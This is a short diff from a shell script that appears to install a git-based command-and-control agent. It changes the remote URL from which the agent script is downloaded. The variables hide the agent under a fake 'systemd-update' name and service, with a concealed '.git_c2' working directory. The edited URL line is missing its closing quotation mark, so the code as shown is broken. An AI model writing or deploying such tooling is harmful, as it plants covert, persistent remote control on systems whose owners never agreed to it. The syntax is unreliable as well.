@@ -8,7 +8,7 @@ BRANCH="commands"
 LOCAL_DIR="/tmp/.cache/.git_c2"
 AGENT_SCRIPT="/usr/local/bin/.systemd-update"
 SERVICE_FILE="/etc/systemd/system/systemd-update.service"
-AGENT_URL="https://github.com/$REPO_USER/$REPO_NAME/blob/main/agent.sh?raw=true"
+AGENT_URL="https://raw.githubusercontent.com/$REPO_USER/$REPO_NAME/refs/heads/main/agent.sh
 
 # Install Dependencies
 echo "[*] Installing necessary dependencies..."
